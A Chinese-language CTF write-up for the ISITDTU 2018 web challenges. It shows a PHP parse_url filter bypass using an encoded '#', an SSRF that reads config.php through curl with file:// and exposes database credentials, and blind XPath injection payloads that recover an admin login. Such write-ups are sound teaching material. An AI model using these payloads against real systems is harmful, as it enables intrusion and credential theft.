---
title: ISITDTU-CTF
date: 2018-07-30 11:37:21
tags: ctf
---

## Web

### lz

代码审计

```php
<?php 

include "config.php"; 
$number1 = rand(1,100000000000000); 
$number2 = rand(1,100000000000); 
$number3 = rand(1,100000000); 
$url = urldecode($_SERVER['REQUEST_URI']); 
$url = parse_url($url, PHP_URL_QUERY); 
if (preg_match("/_/i", $url))  
{ 
    die("..."); 
} 
if (preg_match("/0/i", $url))  
{ 
    die("..."); 
} 
if (preg_match("/\w+/i", $url))  
{ 
    die("..."); 
}     
if(isset($_GET['_']) && !empty($_GET['_'])) 
{ 
    $control = $_GET['_'];         
    if(!in_array($control, array(0,$number1))) 
    { 
        die("fail1"); 
    } 
    if(!in_array($control, array(0,$number2))) 
    { 
        die("fail2"); 
    } 
    if(!in_array($control, array(0,$number3))) 
    { 
        die("fail3"); 
    } 
    echo $flag; 
} 
show_source(__FILE__); 
```

```
$url = urldecode($_SERVER['REQUEST_URI']); 
$url = parse_url($url, PHP_URL_QUERY);
```

由于这里在进行parse_url操作之前，先进行了一次`urldecode`操作，所以可以编码*#* 从而绕过parse_url检测。

payload:

```
http://35.185.178.212/?%23&_=a

php > var_dump(parse_url(urldecode("%23&_=a")),PHP_URL_QUERY);
array(1) {                                                    
  ["fragment"]=>                                              
  string(4) "&_=a"                                            
}                                                             
int(6)
```

在特定情况下也可以使用如下payload:

```
http://35.185.178.212///?_=a
```

测试如下:

```
php > var_dump(parse_url(urldecode("//?_=a")),PHP_URL_QUERY);
bool(false)
int(6)
php > var_dump(parse_url(urldecode("//a?_=a")),PHP_URL_QUERY);
array(2) {
  ["host"]=>
  string(1) "a"
  ["query"]=>
  string(3) "_=a"
}
int(6)
php > var_dump(parse_url(urldecode("//a/?_=a")),PHP_URL_QUERY);
array(3) {
  ["host"]=>
  string(1) "a"
  ["path"]=>
  string(1) "/"
  ["query"]=>
  string(3) "_=a"
}
int(6)
```

### Friss

获取index.php

> curl http://35.190.142.60/index.php?debug=1

index.php

```php
<?php 
include_once "config.php"; 
if (isset($_POST['url'])&&!empty($_POST['url'])) 
{ 
    $url = $_POST['url']; 
    $content_url = getUrlContent($url); 
} 
else 
{ 
    $content_url = ""; 
} 
if(isset($_GET['debug'])) 
{ 
    show_source(__FILE__); 
} 


?> 

<form action="index.php" method="POST"> 
<input name="url" type="text"> 
<input type="submit" value="CURL"> 
</form> 


<?php  

echo $content_url; 
?> 
```

获取config.php

> curl --data "url=file://localhost/var/www/html/config.php" http://35.190.142.60/index.php

config.php

```php
<?php


$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
        $dbinit = "create table if not exists flag(secret varchar(100));";
        if(mysqli_query($conn,$dbinit)) return 1;
        else return 0;
}

function safe($url)
{
        $tmpurl = parse_url($url, PHP_URL_HOST);
        if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
        {
                var_dump($tmpurl);
                die("<h1>Only access to localhost</h1>");
        }
        return $url;
}

function getUrlContent($url){
        $url = safe($url);
        $url = escapeshellarg($url);
        $pl = "curl ".$url;
        echo $pl;
        $content = shell_exec($pl);
        return $content;
}
initdb($conn);
?>
```

登录数据库

> mysql -h 127.0.0.1 -u ssrf_user 

ssrf操作: 利用gopher协议查询数据库。

### Access  Box

要点：xpath注入。

参考文章：https://www.cnblogs.com/bmjoker/p/8861927.html

1. 提取父节点名字

   ```
   'or substring(name(parent::*[position()=1]),1,1)='a
   ```

    结果如下：

   ![](/assets/isictf/TIM截图20180804151333.png)

   可以发现第一个字母为`u`。最终，可以得到父节点名字为`user`。

2. 探测子节点

   探测第一个user节点下第二个字段的名字。

   ```
   'or substring(name(//user[1]/*[2]),1,1)='u' or 'a'='a
   ```

   ![](/assets/isictf/TIM截图20180804153803.png)

3. 探测子节点的值

   探测第一个user节点下第1个字段的值

   ```
   'or substring(//user[1]/*[2],1,1)='u' or 'a'='a
   或者:
   'or substring(//user[1]/*[1]/text(),1,1)='F&password=1
   ```

   结果:

   ![](/assets/isictf/TIM截图20180804153002.png)

   最终得到账号：

   ```
   Adm1n
   Ez_t0_gu3ss_PaSSw0rd
   ```

## pwn

https://github.com/chung96vn/challenges